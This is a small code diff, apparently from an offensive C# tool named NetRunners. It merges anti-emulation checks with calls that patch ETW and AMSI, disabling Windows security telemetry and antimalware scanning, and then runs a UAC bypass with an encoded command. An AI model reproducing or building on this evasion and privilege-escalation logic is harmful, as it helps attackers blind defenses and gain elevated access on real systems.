@@ -45,14 +45,10 @@ namespace NetRunners.Uac
             }
             else
             {
-                // AV stuff
-                if ((!Sleep()) || (!NonEmulated()))
-                {
+                // call heuristic functions
+                if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                     return;
-                }
-                // call patchers
-                if ((!PatchEtw()) || (!PatchAmsi()))
-                    return;
+
                 // execute
                 ExecuteBypass(bypass, encodedCommand);
             }
